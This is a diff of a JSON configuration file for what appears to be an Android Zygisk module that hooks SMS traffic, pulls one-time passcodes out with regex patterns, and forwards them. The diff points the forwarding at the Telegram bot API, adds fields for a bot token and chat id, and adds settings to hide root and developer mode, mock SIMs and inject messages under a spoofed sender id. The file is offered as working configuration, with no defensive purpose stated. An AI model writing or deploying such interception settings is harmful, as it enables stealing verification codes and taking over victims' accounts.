@@ -1,13 +1,19 @@
 {
+  "hide_root": true,
+  "hide_developer": true,
+  "enable_sim1_mock": false,
+  "enable_sim2_mock": false,
+  "mock_country_iso": "in",
   "hook_incoming_sms": true,
   "hook_outgoing_sms": true,
   "auto_extract_otp": true,
   "auto_forward_token": true,
-  "forward_url": "https://your-webhook.example.com/otp",
+  "forward_url": "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage",
   "forward_method": "POST",
+  "telegram_chat_id": "",
+  "telegram_bot_token": "",
   "forward_headers": {
-    "Content-Type": "application/json",
-    "Authorization": "Bearer YOUR_TOKEN"
+    "Content-Type": "application/json"
   },
   "otp_patterns": [
     "\\b(\\d{4,8})\\b.*(?:otp|code|verification|verify|pin)",
@@ -16,5 +22,5 @@
   ],
   "inject_sender_id": "AD-TEST-S",
   "inject_message_body": "",
-  "log_file": "/data/local/tmp/zygisk_sms_otp.log"
+  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
 }
